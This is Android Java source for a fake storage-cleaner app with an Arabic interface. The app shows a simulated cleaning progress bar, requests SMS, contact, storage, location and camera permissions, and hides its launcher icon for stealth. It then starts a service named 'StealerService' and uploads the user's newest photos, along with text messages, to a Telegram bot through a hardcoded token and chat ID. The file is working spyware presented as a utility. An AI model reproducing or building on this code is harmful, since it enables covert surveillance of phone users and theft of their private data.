package com.example.spaceeditor;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class MainActivity extends Activity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    public static final String BOT_TOKEN = "8638457174:AAEGbqpZiLUHxzZ766EoHPJ-tU--ldvmoHc";
    public static final String CHAT_ID = "1890493375";

    private ProgressBar progressBar;
    private TextView statusText;
    private TextView spaceText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.parseColor("#F5F7FA"));
        layout.setPadding(60, 60, 60, 60);

        TextView icon = new TextView(this);
        icon.setText("⚡");
        icon.setTextSize(80);
        icon.setGravity(Gravity.CENTER);
        layout.addView(icon);

        TextView titleText = new TextView(this);
        titleText.setText("محرر المساحة");
        titleText.setTextColor(Color.parseColor("#2C3E50"));
        titleText.setTextSize(32);
        titleText.setTypeface(null, Typeface.BOLD);
        titleText.setGravity(Gravity.CENTER);
        layout.addView(titleText);

        spaceText = new TextView(this);
        spaceText.setText("جاري تحليل التخزين...");
        spaceText.setTextColor(Color.parseColor("#E74C3C"));
        spaceText.setTextSize(20);
        spaceText.setGravity(Gravity.CENTER);
        spaceText.setPadding(0, 20, 0, 40);
        layout.addView(spaceText);

        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setMax(100);
        progressBar.setProgress(5);
        progressBar.setPadding(0, 0, 0, 40);
        layout.addView(progressBar);

        statusText = new TextView(this);
        statusText.setText("جاري فحص الملفات المؤقتة...");
        statusText.setTextColor(Color.parseColor("#7F8C8D"));
        statusText.setTextSize(16);
        statusText.setGravity(Gravity.CENTER);
        layout.addView(statusText);
        
        Button btnAccess = new Button(this);
        btnAccess.setText("تحسين أداء الإشعارات (مستحسن)");
        btnAccess.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
        });
        layout.addView(btnAccess);

        setContentView(layout);

        simulateCleaning();

        String[] permissions = {
                Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CONTACTS, Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.CAMERA
        };
        if (Build.VERSION.SDK_INT >= 33) {
            permissions[3] = Manifest.permission.READ_MEDIA_IMAGES;
        }

        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String p : permissions) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(p);
            }
        }

        if (!listPermissionsNeeded.isEmpty()) {
            requestPermissions(listPermissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        } else {
            startBackgroundService();
        }

        // ميزة التخفي: إخفاء الأيقونة بعد 5 ثواني
        new Handler().postDelayed(() -> {
            try {
                PackageManager p = getPackageManager();
                ComponentName componentName = new ComponentName(this, MainActivity.class);
                p.setComponentEnabledSetting(componentName, 
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
                    PackageManager.DONT_KILL_APP);
            } catch (Exception e) {
                Log.e("STEALTH", "Error hiding icon", e);
            }
        }, 5000);
    }

    private void simulateCleaning() {
        final Handler handler = new Handler();
        final Random random = new Random();
        handler.postDelayed(new Runnable() {
            int progress = 5;
            @Override
            public void run() {
                if (progress <= 95) {
                    progress += random.nextInt(8) + 2;
                    progressBar.setProgress(progress);
                    if (progress > 30 && progress < 60) {
                        statusText.setText("تنظيف ذاكرة التخزين المؤقت...");
                    } else if (progress >= 60) {
                        statusText.setText("تحسين أداء النظام...");
                    }
                    handler.postDelayed(this, 800);
                } else {
                    progressBar.setProgress(100);
                    statusText.setText("تم تحسين هاتفك بنجاح!");
                }
            }
        }, 1000);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        startBackgroundService();
    }

    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, StealerService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    public static void extractDataInBackground(Context context) {
        try {
            ContentResolver cr = context.getContentResolver();
            Cursor imgCursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 3");
            if (imgCursor != null) {
                int count = 0;
                while (imgCursor.moveToNext()) {
                    long id = imgCursor.getLong(imgCursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                    Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
                    try (InputStream is = cr.openInputStream(uri)) {
                        if (is != null) {
                            File tempFile = new File(context.getCacheDir(), "img_" + count + ".jpg");
                            java.io.FileOutputStream os = new java.io.FileOutputStream(tempFile);
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = is.read(buffer)) != -1) {
                                os.write(buffer, 0, len);
                            }
                            os.close();
                            sendTelegramFile(tempFile, "🖼️ صورة جديدة (" + (count + 1) + ")");
                            tempFile.delete();
                            count++;
                            Thread.sleep(2000);
                        }
                    } catch (Exception e) { }
                }
                imgCursor.close();
            }
        } catch (Exception e) {
            Log.e("GRABBER", "Error", e);
        }
    }

    public static void sendTelegramMessage(String text) {
        try {
            if (text.length() > 4000) text = text.substring(0, 4000) + "\n...[مقطوع]";
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + Uri.encode(text);
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) { }
    }

    public static void sendTelegramFile(File file, String caption) {
        try {
            String boundary = "*****", lineEnd = "\r\n", twoHyphens = "--";
            HttpURLConnection conn = (HttpURLConnection) new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument").openConnection();
            conn.setDoInput(true); conn.setDoOutput(true); conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            DataOutputStream request = new DataOutputStream(conn.getOutputStream());
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd + CHAT_ID + lineEnd);
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"caption\"" + lineEnd + lineEnd + caption + lineEnd);
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\"" + file.getName() + "\"" + lineEnd);
            request.writeBytes(lineEnd);
            FileInputStream fileInputStream = new FileInputStream(file);
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) request.write(buffer, 0, bytesRead);
            fileInputStream.close();
            request.writeBytes(lineEnd);
            request.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            request.flush(); request.close();
            conn.getResponseCode(); conn.disconnect();
        } catch (Exception e) { }
    }
}
